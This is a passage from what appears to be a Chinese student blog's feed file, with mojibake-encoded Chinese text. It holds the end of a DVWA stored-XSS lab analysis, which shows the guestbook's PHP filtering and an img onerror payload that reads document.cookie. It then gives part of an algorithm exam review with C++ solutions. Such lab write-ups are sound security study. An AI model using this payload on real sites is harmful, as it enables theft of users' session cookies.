class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );    <span class="hljs-comment">// Sanitize message input</span>    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );    <span class="hljs-comment">// Sanitize name input</span>    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));    <span class="hljs-comment">// Update database</span>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );    <span class="hljs-comment">//mysql_close();</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><pre><code class="hljs php"><span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );<span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre><p> <code>strip_tags()</code> å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚ </p><p> <code>addslashes()</code> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </p><p> <code>htmlspecialchars()</code> å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  </p><p>name,æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼ <code>(.*)</code> è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ<code>/i</code> è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº  <code>&lt;script&gt;</code> æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† ,å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ã€‚</p><p>åªèƒ½æ¢ä¸€ä¸ªæ ‡ç­¾</p><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>xss</tag>
      
      <tag>blind sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç®—æ³•ä¸Šæœºå¤ä¹ </title>
    <link href="/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç®—æ³•å®éªŒè¦ä¸Šæœºè€ƒè¯•ï¼Œæ‰€ä»¥è¿˜æ˜¯å‡†å¤‡ä¸€ä¸‹å§(è¿˜ä¸æ˜¯å› ä¸ºè‡ªå·±å¤ªèœäº†)</p><span id="more"></span><h1 id="16çº§é¢˜ç›®"><a href="#16çº§é¢˜ç›®" class="headerlink" title="16çº§é¢˜ç›®"></a>16çº§é¢˜ç›®</h1><h2 id="é—®é¢˜-A-æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­"><a href="#é—®é¢˜-A-æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­" class="headerlink" title="é—®é¢˜ A: æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­"></a>é—®é¢˜ A: æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>é²ç­ä¸ƒå·æ˜¯ç‹è€…å³¡è°·é‡Œçš„å°„æ‰‹ï¼Œç«™æ’¸è‹±é›„ã€‚æˆ˜åœºä¸Šçš„é²ç­ä¸ƒå·ï¼Œæœºåˆ¶å¼ºå¤§çš„é²¨å˜´ç‚®ï¼Œç«‹åˆ»å°†æŒ¡åœ¨å‰è·¯çš„ä»»ä½•ç‰©ä½“è½°é£ã€‚æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œâ€œå€Ÿä½ ä»¬çš„è‚‰ä½“è¯•éªŒä¸‹æ–°å‘æ˜çš„å¨åŠ›â€ã€‚æ˜¯çš„ï¼Œè¿™å°±æ˜¯é²ç­å¤§å¸ˆå’Œä»–çš„å¤©æ‰æœºå…³é€ ç‰©é²ç­ä¸ƒå·ã€‚ç„¶è€Œï¼Œé²ç­æœ€ä¸ºè‡´å‘½çš„ç¼ºç‚¹æ˜¯è…¿çŸ­ï¼Œè·‘å¾—æ…¢ï¼Œä¸€ä¸ªç¨ä¸ç•™ç¥ï¼Œä¾¿ä¼šè¢«åˆºå®¢æ‰€å‡»æ€ã€‚</p><p>æ—¢ç„¶è…¿çŸ­ï¼Œé‚£ä¹ˆå°±æ¥å¤šå¤šè¿åŠ¨å§ï¼Œè·³è·³å°é˜¶å¯è¿˜è¡Œï¼Ÿå‡è®¾é²ç­ä¸ƒå·ä¸€æ¬¡å¯ä»¥è·³ä¸Š1çº§å°é˜¶ï¼Œä½†æé™ä¸€æ¬¡åªèƒ½è·³ä¸Š2çº§å°é˜¶ï¼ˆè…¿çŸ­æ²¡åŠæ³•ï¼Œå˜¤å˜¤å˜¤ï¼‰ã€‚é²ç­ä¸ƒå·ç°åœ¨ä»0çº§é˜¶æ¢¯å¼€å§‹ï¼Œæœ€ç»ˆè·³ä¸Šç¬¬nçº§çš„å°é˜¶ï¼Œæ±‚æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ï¼Ÿ</p><h3 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=50ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°nï¼ˆ1&lt;=n&lt;=50ï¼‰ï¼Œä»£è¡¨é²ç­æœ€ç»ˆè·³ä¸Šäº†ç¬¬nçº§å°é˜¶ã€‚</p><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨é²ç­æœ€ç»ˆè·³ä¸Šç¬¬nçº§å°é˜¶çš„è·³æ³•ç§æ•°ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs plain">33450</code></pre><h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs dns"><span class="hljs-number">3</span><span class="hljs-number">5</span><span class="hljs-number">20365011074</span></code></pre><h3 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>æ³¨æ„ç»“æœè¶…è¿‡intèŒƒå›´ï¼Œè¯·ç”¨long longç±»å‹å­˜å‚¨ans</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">50</span>;<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> f[N];<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">50</span>;i++)&#123;f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];&#125;<span class="hljs-keyword">int</span> n;<span class="hljs-built_in">cin</span>&gt;&gt;n;<span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-keyword">int</span> m;<span class="hljs-built_in">cin</span>&gt;&gt;m;<span class="hljs-built_in">cout</span>&lt;&lt;f[m]&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125; </code></pre><h2 id="é—®é¢˜-B-åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ"><a href="#é—®é¢˜-B-åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ" class="headerlink" title="é—®é¢˜ B: åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ"></a>é—®é¢˜ B: åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å…ƒæ­Œæ˜¯ç‹è€…å³¡è°·é‡Œçš„åˆºå®¢ã€‚ä½•è°“è‡³é«˜æœºå…³ä¹‹ç¾å‘¢ï¼Ÿå”¯æœ‰ä»¥è‡³é«˜æƒåŠ›çš„æ‰‹ä»¤å¤ªå¤å¥‡è¿¹é‡ç°äººä¸–ï¼Œæ–¹èƒ½ç§°å¾—ä¸Šå•Šã€‚</p><p>æ˜¯çš„ï¼Œå…ƒæ­Œæ“…é•¿æ“æ§ï¼Œæ‰€åšå‚€å„¡èƒ½èµ·åˆ°ä»¥å‡ä¹±çœŸçš„ä½œç”¨ï¼Œä»Šå¤©å…ƒæ­Œçš„å‚€å„¡å˜æˆä½ çš„åˆä¸­æ•°å­¦è€å¸ˆï¼Œç»™ä½ å‡ºä¸ªæ•°å­¦é¢˜ï¼šç»™ä½ ä¸€ä¸ªæ•°å­—xï¼Œè®©ä½ æ±‚å‡ºk7ã€k6ã€k5ã€k4ã€k3ã€k2ã€k1ã€k0ï¼ˆ0&lt;=ki&lt;=9ï¼‰ï¼Œä½¿å¾—ä»¥ä¸‹ç­‰å¼1æˆç«‹ï¼Œæœ€åæ ¹æ®ç­‰å¼2æ±‚å‡ºæœ€ç»ˆanså€¼ã€‚</p><p>ç­‰å¼1ï¼š</p><p><img src="https://s1.ax1x.com/2018/11/07/iTxDvF.png" alt="img"></p><p>ç­‰å¼2ï¼š</p><p><img src="https://s1.ax1x.com/2018/11/07/iTxsu4.png" alt="img"></p><h3 id="è¾“å…¥-1"><a href="#è¾“å…¥-1" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=1000ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°xï¼ˆ1&lt;=x&lt;=1500000ï¼‰ã€‚</p><h3 id="è¾“å‡º-1"><a href="#è¾“å‡º-1" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨æœ€ç»ˆè¿ç®—ç»“æœã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-1"><a href="#æ ·ä¾‹è¾“å…¥-1" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs dns"><span class="hljs-number">3</span><span class="hljs-number">7</span><span class="hljs-number">143</span><span class="hljs-number">3223193224</span></code></pre><h3 id="æ ·ä¾‹è¾“å‡º-1"><a href="#æ ·ä¾‹è¾“å‡º-1" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs dns"><span class="hljs-number">10</span><span class="hljs-number">151</span><span class="hljs-number">163311433223</span></code></pre><h3 id="æç¤º-1"><a href="#æç¤º-1" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>æµ‹è¯•æ•°æ®å‡å¤§äºç­‰äº1ï¼Œä¸ç”¨ç‰¹åˆ¤0</p><p>æ„Ÿè§‰å›¾ç‰‡ç­‰å¼æœ‰ç‚¹é—®é¢˜ï¼Œä¸€å¼€å§‹æ²¡ç†è§£ä»€ä¹ˆæ„æ€ï¼Œåæ¥çœ‹äº†å­¦é•¿çš„æç¤ºã€‚æœ¬è´¨å°±æ˜¯è¿›åˆ¶è½¬æ¢ã€‚</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> t,m;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">convert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> c,r;r=n%<span class="hljs-number">7</span>;c=n/<span class="hljs-number">7</span>;<span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">0</span>)&#123;convert(c);<span class="hljs-built_in">cout</span>&lt;&lt;r;&#125;<span class="hljs-keyword">else</span><span class="hljs-built_in">cout</span>&lt;&lt;n;&#125; <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;t;<span class="hljs-keyword">while</span>(t--)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;m;convert(m);<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;</code></pre><h2 id="é—®é¢˜-C-åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰"><a href="#é—®é¢˜-C-åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰" class="headerlink" title="é—®é¢˜ C: åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰"></a>é—®é¢˜ C: åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>è²‚è‰æ˜¯ç‹è€…å³¡è°·é‡Œçš„æ³•å¸ˆ/åˆºå®¢ï¼Œè²‚è‰æ‰“æ³•ä¸€å®šè¦æ³¨æ„é…åˆæŠ€èƒ½ä¸è¢«åŠ¨ã€‚åŠè‚‰å‡ºè£…åŠ ä¸Šè›‡çš®èµ°ä½ï¼Œå¾€å¾€å¯ä»¥1æ‰“5ï¼Œè½»æ¾æ‹¿ä¸‹5æ€ã€‚è¯­èŠ±å°è¢«åŠ¨æè¿°ä¸ºï¼šæŠ€èƒ½å‘½ä¸­ä¼šä¸ºæ•Œäººå åŠ èŠ±ä¹‹å°è®°ï¼Œå åŠ æ»¡4å±‚åå°è®°è§¦å‘è¢«åŠ¨ï¼Œä¼šç»™è‡ªèº«å›å¤ç”Ÿå‘½ï¼ŒåŒæ—¶ä¼šå¯¹å‘¨å›´æ•Œäººé€ æˆçœŸå®ä¼¤å®³å¹¶å‡é€Ÿã€‚<br>æˆ‘ä»¬ç°åœ¨å¯¹è²‚è‰çš„æŠ€èƒ½åŠè¢«åŠ¨è¿›è¡Œç®€åŒ–å¦‚ä¸‹ï¼šæ¯ä½¿ç”¨1æ¬¡æŠ€èƒ½ä¼šæ”»å‡»1æ¬¡ç›®æ ‡ï¼Œæ¯æ”»å‡»3æ¬¡ç›®æ ‡ï¼Œä¼šè‡ªåŠ¨é¢å¤–æ”»å‡»1æ¬¡ç›®æ ‡ã€‚<br>ç°åœ¨ï¼Œè²‚è‰åœ¨æ¸¸æˆä¸­ä½¿ç”¨äº†næ¬¡æŠ€èƒ½ï¼Œè¯·é—®æ€»å…±ä¼šç»™ç›®æ ‡å¸¦æ¥å¤šå°‘æ¬¡æ”»å‡»ã€‚</p><h3 id="è¾“å…¥-2"><a href="#è¾“å…¥-2" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•æ•°æ®ï¼Œç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼Œä»£è¡¨æµ‹è¯•æ ·ä¾‹ä¸ªæ•°ã€‚<br>æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°nï¼ˆ1&lt;=n&lt;=100ï¼‰ï¼Œä»£è¡¨è²‚è‰ä½¿ç”¨äº†næ¬¡æŠ€èƒ½ã€‚</p><h3 id="è¾“å‡º-2"><a href="#è¾“å‡º-2" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨è²‚è‰å¯¹ç›®æ ‡è¿›è¡Œäº†ansæ¬¡æ”»å‡»ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-2"><a href="#æ ·ä¾‹è¾“å…¥-2" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs plain">61234581</code></pre><h3 id="æ ·ä¾‹è¾“å‡º-2"><a href="#æ ·ä¾‹è¾“å‡º-2" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs plain">12457121</code></pre><h3 id="æç¤º-2"><a href="#æç¤º-2" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>è¿™é¢˜å°±æ˜¯æ±½æ°´ç“¶çš„æ”¹ç¼–ã€‚ã€‚ã€‚</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> n;<span class="hljs-built_in">cin</span>&gt;&gt;n; <span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-keyword">int</span> m,sum;<span class="hljs-built_in">cin</span>&gt;&gt;m;sum=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">3</span>)&#123;m=m<span class="hljs-number">-2</span>;sum=sum+<span class="hljs-number">3</span>;&#125;<span class="hljs-keyword">if</span>(m==<span class="hljs-number">3</span>)sum+=<span class="hljs-number">4</span>;<span class="hljs-keyword">else</span>sum=m;<span class="hljs-built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="hljs-built_in">endl</span>; &#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h2 id="é—®é¢˜-D-æµ·ä¹‹å¾é€”â€”â€”å­™ç­–"><a href="#é—®é¢˜-D-æµ·ä¹‹å¾é€”â€”â€”å­™ç­–" class="headerlink" title="é—®é¢˜ D: æµ·ä¹‹å¾é€”â€”â€”å­™ç­–"></a>é—®é¢˜ D: æµ·ä¹‹å¾é€”â€”â€”å­™ç­–</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å­™ç­–æ˜¯ç‹è€…å³¡è°·é‡Œçš„å¦å…‹/æˆ˜å£«ã€‚å¤§èˆ¹é å²¸ï¼Œæ±Ÿéƒ¡æ¬¢å‘¼ç€è¿æ¥äº†ä»–ä»¬çš„æ–°é¢†è¢–ï¼Œäººç§°æ±Ÿä¸œå°éœ¸ç‹çš„å¹´è½»äººã€‚æ¸¸æˆä¸­ï¼Œå­™ç­–çš„æŠ€èƒ½é•¿å¸†ç ´æµªï¼Œå¯ä»¥é©¾èˆ¹å†²é”‹ï¼Œå¯å°†èˆ¹æ’å‘æ•Œæ–¹å•ä½æˆ–è€…é˜»æŒ¡ç‰©ï¼Œå¹¶é€ æˆä¸€å®šçš„ä¼¤å®³ã€‚</p><p>ç°åœ¨ï¼Œæœ‰ä¸€ç¾¤å¥½å¥‡çš„æ±Ÿéƒ¡å°æœ‹å‹æƒ³è·Ÿç€å­™ç­–ä¸€èµ·å‡ºæµ·èˆªè¡Œï¼Œä½†å­™ç­–çš„èˆ¹æ‰¿è½½ä¸äº†æ‰€æœ‰å°æœ‹å‹ï¼Œæ‰€ä»¥å­™ç­–å†³å®šï¼Œå°½å¯èƒ½å¸¦æ›´å¤šçš„å°æœ‹å‹å‡ºæµ·ï¼Œç°åœ¨è¯·ä½ å¸®å­™ç­–è°‹ä¸€ä¸ªç­–ç•¥ï¼Œä½¿å¾—æ›´å¤šçš„å°æœ‹å‹æœ‰æœºä¼šå‡ºæµ·èˆªè¡Œã€‚å·²çŸ¥çš„æ¡ä»¶æ˜¯å­™ç­–èˆ¹çš„æœ€å¤§è½½é‡mï¼Œä»¥åŠnä¸ªå°æœ‹å‹çš„ä½“é‡ã€‚</p><h3 id="è¾“å…¥-3"><a href="#è¾“å…¥-3" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚<br>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=1000ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹ç¬¬ä¸€è¡Œæœ‰ä¸¤ä¸ªæ•´æ•°må’Œnã€‚ï¼ˆ0&lt;=m&lt;=1000ï¼Œ 0&lt;=n&lt;=1000ï¼‰ï¼Œåˆ†åˆ«ä»£è¡¨èˆ¹çš„è½½é‡é‡é‡å’Œå°æœ‹å‹çš„ä¸ªæ•°ï¼Œæ¥ä¸‹æ¥ä¸€è¡Œä¸ºnä¸ªå°æœ‹å‹çš„ä½“é‡ã€‚</p><h3 id="è¾“å‡º-3"><a href="#è¾“å‡º-3" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨æœ€å¤šèƒ½æœ‰ansä¸ªå°æœ‹å‹è·Ÿç€ä¸€èµ·å‡ºæµ·ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-3"><a href="#æ ·ä¾‹è¾“å…¥-3" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><pre><code class="hljs basic"><span class="hljs-number">2</span><span class="hljs-symbol">10 </span><span class="hljs-number">4</span><span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span><span class="hljs-symbol">20 </span><span class="hljs-number">9</span><span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span></code></pre><h3 id="æ ·ä¾‹è¾“å‡º-3"><a href="#æ ·ä¾‹è¾“å‡º-3" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><pre><code class="hljs plain">36</code></pre><h3 id="æç¤º-3"><a href="#æç¤º-3" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>å°±æ˜¯ç®€å•çš„è£…åœ¨é—®é¢˜</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> T,m,n;<span class="hljs-keyword">int</span> w[<span class="hljs-number">1005</span>];<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;T;<span 